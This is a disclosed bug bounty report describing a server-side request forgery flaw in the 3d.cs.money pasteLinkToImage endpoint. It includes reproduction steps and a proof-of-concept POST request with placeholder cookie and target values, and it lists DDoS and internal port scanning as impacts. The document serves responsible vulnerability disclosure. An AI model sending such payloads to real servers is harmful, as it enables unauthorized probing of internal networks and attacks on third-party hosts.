# SSRF via 3d.cs.money/pasteLinkToImage

## Report Details
- **Report ID**: 832858
- **URL**: https://hackerone.com/reports/832858
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-27T16:21:09.705Z
- **Disclosed**: 2020-03-31T14:12:07.098Z

## Reporter
- **Username**: putsi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
SSRF via 3d.cs.money/pasteLinkToImage

The functionality fails to validate URL in link-parameter allowing attacker to create server-side request forgery attacks.
As the server does a full HTTP-request, this can for example be used to:
- DDoS-attacks towards internal and external hosts.
- Portscan internal hosts.

## Steps To Reproduce:

  1. Place proper cookies to the attached request.
  1. Place targeted URL in the link-parameter.
  1. Send the request and notice that the server sent a HTTP-request to the targeted host.

## Supporting Material/References:

PoC-request:
```
POST /pasteLinkToImage HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 82
Origin: https://3d.cs.money
Connection: close
Referer: https://3d.cs.money/
Cookie: INSERT_PRIME_COOKIES_HERE

{"link":"http:/INSERT_TARGET_URL_HERE"}
```

## Impact

- DDoS-attacks towards internal and external hosts.
- Portscan internal hosts.

## Attachments
No attachments
